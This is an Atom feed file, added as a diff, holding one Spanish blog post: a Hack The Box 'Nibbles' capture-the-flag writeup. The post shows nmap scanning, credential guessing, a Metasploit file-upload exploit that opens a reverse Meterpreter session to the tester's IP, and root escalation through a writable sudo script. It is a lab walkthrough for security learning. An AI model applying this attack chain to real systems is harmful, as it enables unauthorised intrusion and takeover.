@@ -1,0 +1,87 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-03-11T04:42:38+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">SS3K | SSEKURITY</title><subtitle>Entusiasta de tecnología en general y de la seguridad informática en particular, buscando un lugar en el ámbito de la ciberseguridad.</subtitle><author><name>Bruno &apos;SS3K&apos; G. Ferrara</name><email>ssek@ssekurity.com</email></author><entry><title type="html">HTB Nibbles writeup</title><link href="http://localhost:4000/posts/2025/03/HTB-Nibbles-Writeup/" rel="alternate" type="text/html" title="HTB Nibbles writeup" /><published>2025-03-11T00:00:00+00:00</published><updated>2025-03-11T00:00:00+00:00</updated><id>http://localhost:4000/posts/2025/03/HTB-Nibbles-Writeup</id><content type="html" xml:base="http://localhost:4000/posts/2025/03/HTB-Nibbles-Writeup/"><![CDATA[<h1 id="reconocimiento-inicial">Reconocimiento Inicial</h1>
+
+<p>Comencé con un escaneo básico usando Nmap para identificar puertos abiertos y servicios en la máquina objetivo (10.10.10.75). Ejecuté el siguiente comando:</p>
+
+<p>nmap -p- -T4 -A -v 10.10.10.75</p>
+
+<p>Output relevante:</p>
+
+<p>PORT   STATE SERVICE VERSION<br />
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2<br />
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</p>
+
+<p>Solo había dos servicios activos: SSH y un servidor web. Me enfoqué en el puerto 80.</p>
+
+<h1 id="enumeración-web">Enumeración Web</h1>
+
+<p>Al acceder a http://10.10.10.75, la página mostraba un mensaje simple: “Hello World!”. Inspeccioné el código fuente y encontré un comentario curioso:</p>
+
+<p>&lt; !– /nibbleblog/ –&gt;</p>
+
+<p>Usé Dirbuster para descubrir directorios y archivos bajo /nibbleblog/. Configuré el diccionario directory-list-2.3-medium.txt y encontré:</p>
+
+<p>http://10.10.10.75/nibbleblog/admin.php</p>
+
+<p>Al acceder a esta URL, me topé con un panel de login. Probé credenciales comunes (admin:admin, admin:password), pero sin éxito. Además, noté que después de varios intentos fallidos, el sistema bloqueaba temporalmente las peticiones.</p>
+
+<h1 id="encontrando-credenciales">Encontrando Credenciales</h1>
+
+<p>Recordé que muchos CMS almacenan usuarios en archivos XML. Probé acceder a:</p>
+
+<p>http://10.10.10.75/nibbleblog/content/private/users.xml</p>
+
+<p>Output:</p>
+
+<p>&lt;\user username=”admin”&gt;
+  &lt;\ id type=”integer”&gt;1 &lt;\/id&gt;
+  &lt;\ session_fail_count type=”integer”&gt;0 &lt;\/session_fail_count&gt;
+  &lt;\ session_date type=”integer”&gt;1527728762 &lt;\/session_date&gt;
+&lt;\/user&gt;</p>
+
+<p>Confirmé que el usuario era admin. Para la contraseña, probé combinaciones simples relacionadas con el nombre de la máquina: nibbles, Nibbles123, etc. La que funcionó fue admin:nibbles.
+Explotación con Metasploit</p>
+
+<p>Sabía que Nibbleblog 4.0.3 tenía una vulnerabilidad de subida de archivos. Usé el módulo de Metasploit:
+bash</p>
+
+<p>msfconsole<br />
+use exploit/multi/http/nibbleblog_file_upload<br />
+set RHOSTS 10.10.10.75<br />
+set USERNAME admin<br />
+set PASSWORD nibbles<br />
+set LHOST 10.10.14.10  # Mi IP en HTB<br />
+exploit</p>
+
+<p>Resultado:</p>
+
+<p>Meterpreter session 1 opened (10.10.14.10:4444 -&gt; 10.10.10.75:41846)<br />
+meterpreter &gt; shell</p>
+
+<p>Obtuve una shell como el usuario nibbler.</p>
+
+<h1 id="escalada-de-privilegios">Escalada de Privilegios</h1>
+
+<p>Primero revisé permisos de sudo:</p>
+
+<p>sudo -l</p>
+
+<p>Output:</p>
+
+<p>User nibbler may run the following commands on Nibbles:<br />
+(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh</p>
+
+<p>El script monitor.sh no existía, así que lo creé:</p>
+
+<p>echo “bash -i” &gt; monitor.sh<br />
+chmod +x monitor.sh</p>
+
+<p>Luego, lo ejecuté con sudo:</p>
+
+<p>sudo /home/nibbler/personal/stuff/monitor.sh</p>
+
+<p>Resultado:</p>
+
+<p>root@Nibbles:/home/nibbler/personal/stuff# id<br />
+uid=0(root) gid=0(root) groups=0(root)</p>
+
+<p>¡Conseguí acceso root!</p>]]></content><author><name>Bruno &apos;SS3K&apos; G. Ferrara</name><email>ssek@ssekurity.com</email></author><category term="writeup" /><category term="htb" /><category term="metasploit" /><summary type="html"><![CDATA[Reconocimiento Inicial]]></summary></entry></feed>
